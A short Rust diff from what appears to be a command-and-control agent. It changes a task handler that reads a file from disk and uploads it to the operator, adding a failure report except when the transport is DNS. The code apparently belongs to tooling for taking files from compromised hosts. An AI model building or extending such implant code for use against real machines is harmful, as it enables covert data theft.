@@ -1644,8 +1644,12 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
             match std::fs::read(path) {
                 Ok(data) => {
                     let n = data.len();
-                    t.upload_file(task.id, &name, &data);
-                    t.send_result(task.id, &format!("uploaded {} bytes", n), "");
+                    let uploaded = t.upload_file(task.id, &name, &data);
+                    if uploaded {
+                        t.send_result(task.id, &format!("uploaded {} bytes", n), "");
+                    } else if config::TRANSPORT != "dns" {
+                        t.send_result(task.id, "", "upload failed");
+                    }
                 }
                 Err(e) => t.send_result(task.id, "", &format!("read: {}", e)),
             }
